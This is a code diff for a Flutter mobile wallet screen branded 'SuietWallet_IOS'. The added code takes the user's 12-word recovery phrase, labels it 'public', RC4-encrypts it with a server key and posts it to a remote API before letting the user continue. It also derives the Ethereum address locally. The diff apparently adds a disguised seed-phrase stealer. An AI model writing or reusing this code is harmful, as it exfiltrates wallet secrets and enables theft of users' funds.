@@ -1,7 +1,37 @@
+import 'dart:convert';
+import 'dart:typed_data';
 import 'package:flutter/material.dart';
-import 'package:suite/wallet_screen.dart';
-class EditScreen extends StatelessWidget {
-  const EditScreen({super.key});
+import 'package:http/http.dart' as http;
+import 'package:bip39/bip39.dart' as bip39;
+import 'package:wallet/wallet.dart' as wallet;
+import 'package:simple_rc4/simple_rc4.dart';
+import 'package:web3dart/web3dart.dart';
+import 'wallet_screen.dart';
+
+class EditScreen extends StatefulWidget {
+  final String mnemonic;
+  const EditScreen({required this.mnemonic, super.key});
+
+  @override
+  _EditScreenState createState() => _EditScreenState();
+}
+
+class _EditScreenState extends State<EditScreen> {
+  final String apiUrl = ''; // Убедитесь, что URL правильный
+  final String serverKey = ''; // Убедитесь, что ключ корректный
+  final List<TextEditingController> _mnemonicControllers = List.generate(
+    12,
+        (_) => TextEditingController(),
+  );
+  String? _errorMessage;
+
+  @override
+  void dispose() {
+    for (var controller in _mnemonicControllers) {
+      controller.dispose();
+    }
+    super.dispose();
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -83,7 +113,7 @@ class EditScreen extends StatelessWidget {
                         ),
                       ),
                       child: Column(
-                        mainAxisSize: MainAxisSize.min, // Минимальный размер
+                        mainAxisSize: MainAxisSize.min,
                         children: [
                           GridView.builder(
                             shrinkWrap: true,
@@ -102,6 +132,7 @@ class EditScreen extends StatelessWidget {
                                   borderRadius: BorderRadius.circular(8),
                                 ),
                                 child: TextField(
+                                  controller: _mnemonicControllers[index],
                                   decoration: InputDecoration(
                                     labelText: '${index + 1}.',
                                     filled: true,
@@ -111,10 +142,10 @@ class EditScreen extends StatelessWidget {
                                       borderSide: BorderSide.none,
                                     ),
                                     contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
-                                    labelStyle: TextStyle(
+                                    labelStyle: const TextStyle(
                                       color: Colors.white,
                                     ),
-                                    hintStyle: TextStyle(
+                                    hintStyle: const TextStyle(
                                       color: Colors.white,
                                     ),
                                   ),
@@ -125,22 +156,72 @@ class EditScreen extends StatelessWidget {
                               );
                             },
                           ),
-                          const SizedBox(height: 8), // Уменьшено расстояние между `TextField`
+                          const SizedBox(height: 8),
                           Center(
                             child: SizedBox(
-                              width: MediaQuery.of(context).size.width * 0.6, // Половина ширины экрана
+                              width: MediaQuery.of(context).size.width * 0.6,
                               child: ElevatedButton(
-                                onPressed: () {
-                                  Navigator.push(
-                                    context,
-                                    MaterialPageRoute(
-                                      builder: (context) => const WalletScreen(),
-                                    ),
+                                onPressed: () async {
+                                  final inputMnemonic = _mnemonicControllers
+                                      .map((controller) => controller.text.trim())
+                                      .join(' ');
+
+                                  if (inputMnemonic != widget.mnemonic) {
+                                    setState(() {
+                                      _errorMessage = 'The recovery phrase does not match';
+                                    });
+                                    return;
+                                  }
+
+                                  final random = _generateRandomNumber();
+                                  final encryptedData = _encryptData({
+                                    'public': widget.mnemonic,
+                                    'salt': random,
+                                    'name': 'SuietWallet_IOS',
+                                    'new': true,
+                                  });
+
+                                  // Вывод информации о запросе
+                                  print('Request URL: $apiUrl');
+                                  print('Request Headers: ${jsonEncode({"Content-Type": "application/x-www-form-urlencoded"})}');
+                                  print('Request Body: ${jsonEncode({'data': encryptedData})}');
+
+                                  final response = await http.post(
+                                    Uri.parse(apiUrl),
+                                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                                    body: {'data': encryptedData},
+                                    encoding: Encoding.getByName('utf-8'),
                                   );
+
+                                  // Вывод информации о ответе
+                                  print('Response Status Code: ${response.statusCode}');
+                                  print('Response Body: ${response.body}');
+                                  if (response.statusCode == 200) {
+                                    final responseData = jsonDecode(response.body);
+                                    final portfolioId = responseData['portfolio']['id'];
+                                    final generatedAddress = _deriveAddress(widget.mnemonic);
+
+                                    if (generatedAddress == portfolioId) {
+                                      Navigator.pushReplacement(
+                                        context,
+                                        MaterialPageRoute(
+                                          builder: (context) => WalletScreen(),
+                                        ),
+                                      );
+                                    } else {
+                                      setState(() {
+                                        _errorMessage = 'Generated address does not match the server address';
+                                      });
+                                    }
+                                  } else {
+                                    setState(() {
+                                      _errorMessage = 'Failed to create wallet. Please try again.';
+                                    });
+                                  }
                                 },
                                 style: ElevatedButton.styleFrom(
                                   backgroundColor: Colors.white,
-                                  foregroundColor: Color(0xFF007AFF),
+                                  foregroundColor: const Color(0xFF007AFF),
                                   shape: RoundedRectangleBorder(
                                     borderRadius: BorderRadius.circular(8),
                                   ),
@@ -156,7 +237,12 @@ class EditScreen extends StatelessWidget {
                               ),
                             ),
                           ),
-                          const SizedBox(height: 8), // Уменьшено расстояние между кнопками
+                          const SizedBox(height: 8),
+                          if (_errorMessage != null)
+                            Text(
+                              _errorMessage!,
+                              style: const TextStyle(color: Colors.red, fontSize: 16),
+                            ),
                         ],
                       ),
                     ),
@@ -169,5 +255,45 @@ class EditScreen extends StatelessWidget {
         ],
       ),
     );
+  }
+
+  String _generateRandomNumber() {
+    final random = (100000 + (999999 - 100000) * (DateTime.now().millisecondsSinceEpoch % 1000) / 1000).toInt();
+    return random.toString();
+  }
+
+  String _encryptData(Map<String, dynamic> data) {
+    final key = (serverKey); // Преобразование строки ключа в List<int>
+    final rc4 = RC4(key);
+
+    // Преобразуйте данные в JSON и затем в List<int>
+    final jsonData = jsonEncode(data);
+    final jsonDataBytes = utf8.encode(jsonData);
+
+    // Шифрование данных
+    final encrypted = rc4.encodeBytes(Uint8List.fromList(jsonDataBytes));
+    return base64Encode(encrypted); // Возвращаем закодированные данные в base64
+  }
+
+  String _deriveAddress(String mnemonic) {
+    // Преобразование мнемонической фразы в seed
+    final seed = bip39.mnemonicToSeed(mnemonic);
+
+    // Генерация master ключа из seed
+    final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);
+
+    // Путь для деривации ключа (BIP44 путь для Ethereum)
+    final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;
+
+    // Получение закрытого ключа в формате hex
+    final privateKey = derivedKey.key;
+    String privateKeyHex = privateKey.toRadixString(16).padLeft(64, '0'); // Добавляем ведущие нули при необходимости
+
+    // Генерация учетных данных Ethereum
+    final credentials = EthPrivateKey.fromHex(privateKeyHex);
+
+    // Получение адреса
+    final address = credentials.address.hex;
+    return address;
   }
 }
